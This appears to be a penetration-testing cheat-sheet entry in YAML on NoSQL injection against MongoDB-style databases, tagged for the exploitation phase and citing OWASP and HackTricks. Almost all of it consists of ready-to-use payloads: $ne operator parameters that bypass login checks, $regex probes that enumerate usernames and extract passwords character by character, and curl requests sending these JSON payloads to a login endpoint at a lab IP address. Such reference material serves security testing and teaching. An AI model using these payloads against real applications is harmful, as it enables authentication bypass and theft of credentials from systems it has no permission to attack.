---
description: |
  NoSQL injection techniques against MongoDB and similar databases — authentication bypass, data extraction, and operator abuse.
command: |
  # Authentication bypass — $ne operator
  username[$ne]=admin&password[$ne]=pass

  # Regex extraction — enumerate usernames char by char
  username[$regex]=^a.*&password[$ne]=pass
  username[$regex]=^ad.*&password[$ne]=pass

  # JSON body — auth bypass
  curl -X POST http://10.10.10.27/login -H "Content-Type: application/json" \
    -d '{"username":{"$ne":""},"password":{"$ne":""}}'

  # Extract password with $regex
  curl -X POST http://10.10.10.27/login -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$regex":"^P.*"}}'
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - Injection
references:
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
  - https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
---
